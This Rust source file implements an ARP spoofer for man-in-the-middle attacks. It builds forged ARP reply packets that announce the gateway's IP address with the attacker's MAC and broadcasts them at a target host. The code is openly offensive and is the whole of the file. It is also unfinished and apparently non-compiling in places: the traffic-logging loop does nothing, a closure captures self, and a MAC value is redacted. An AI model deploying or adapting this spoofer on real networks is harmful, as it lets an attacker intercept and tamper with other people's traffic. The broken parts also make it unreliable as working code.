use std::{net::Ipv4Addr, ptr::null, sync::{Arc, Mutex}};

use nix::sys::socket;
use pnet::{packet::{ethernet::{EtherType, MutableEthernetPacket, EtherTypes}, arp::{Arp, ArpHardwareType, ArpOperation, ArpPacket, MutableArpPacket}, MutablePacket}, util::MacAddr, datalink::{self, NetworkInterface, Channel, DataLinkSender, DataLinkReceiver}};

pub trait ArpSpoofer {
    fn spoof_target(&mut self, ip: Ipv4Addr) -> bool;
}

pub struct Mitm {
    pub ipv4: Ipv4Addr,
    pub hw: MacAddr
}

pub struct ArpSpooferImpl {
    interface: NetworkInterface,
    mitm: Mitm,
    gateway: Ipv4Addr,

    sender: Option<Arc<dyn DataLinkSender>>,
    receiver: Option<Mutex<Arc<dyn DataLinkReceiver>>>
}

impl ArpSpooferImpl {
    pub fn new(
        interface: NetworkInterface,
        mitm: Mitm, 
        gateway: Ipv4Addr
    ) -> Self {
        let mut spoofer = Self {
            interface: interface,
            mitm: mitm,
            gateway: gateway,
            sender: None,
            receiver: None
        };

        spoofer.setup_socket();
        spoofer.log_traffic();

        return spoofer;
    }

    fn setup_socket(&mut self) {
        let (tx, rx) = match datalink::channel(&self.interface, Default::default()) {
            Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
            Ok(_) => panic!("Unhandled channel type"),
            Err(e) => panic!("An error occurred when creating the datalink channel: {}", e)
        };

        // let abc = rx as Box<dyn DataLinkReceiver + Send>;

        self.sender = Some(Arc::from(tx));
        self.receiver = Some(Mutex::new(Arc::from(rx)));
    }

    fn log_traffic(&mut self) {
        tokio::task::spawn_blocking(move || {
            let receiver = self.receiver.unwrap().lock().unwrap();
            loop {
                match receiver.next() {
                    Ok(something) => {

                    },
                    Err(err) => {
                        
                    }
                }
            }
        });
    }
}

impl ArpSpoofer for ArpSpooferImpl {
    fn spoof_target(&mut self, target: Ipv4Addr) -> bool {
        // instantiate packet

        println!("Spoofing target: {}", target.to_string());

        // TODO: (@objectivecosta) Modify these values
        let mut arp_packet_buffer = [0u8; 28];
        let mut  arp_packet = MutableArpPacket::new(&mut arp_packet_buffer).unwrap();
        arp_packet.set_hardware_type(ArpHardwareType::new(1)); // Ethernet
        arp_packet.set_protocol_type(EtherType::new(0x0800)); // IPv4
        arp_packet.set_hw_addr_len(6);  // ethernet is 6 long
        arp_packet.set_proto_addr_len(4);  // ipv4s is 4 long
        arp_packet.set_operation(ArpOperation::new(2));  // 1 is request; 2 is reply.
        arp_packet.set_sender_hw_addr(self.mitm.hw); 
        arp_packet.set_sender_proto_addr(self.gateway); 
        arp_packet.set_target_hw_addr(MacAddr(***REMOVED***)); // TODO: find this information manually
        arp_packet.set_target_proto_addr(target); 

        let mut ethernet_buffer = [0u8; 42];
        let mut ethernet_packet = MutableEthernetPacket::new(&mut ethernet_buffer).unwrap();

        ethernet_packet.set_destination(MacAddr::broadcast());
        ethernet_packet.set_source(self.interface.mac.unwrap());
        ethernet_packet.set_ethertype(EtherTypes::Arp);
        ethernet_packet.set_payload(arp_packet.packet_mut());

        println!("Assembled packets!");
        println!("Preparing to send packet!");

        if let Some(sender) = self.sender.as_mut() {
            let send_opt = sender.send_to(ethernet_packet.packet_mut(), None);

                if let Some(send_res) = send_opt {
                    if let Ok(_) = send_res {
                        println!("Sent packet successfully!");
                        return true
                    } else {
                        println!("Failed on second part!");
                    }
        
                } else {
                    println!("Failed on first part!");
                }   
        }

        return false;
    }
}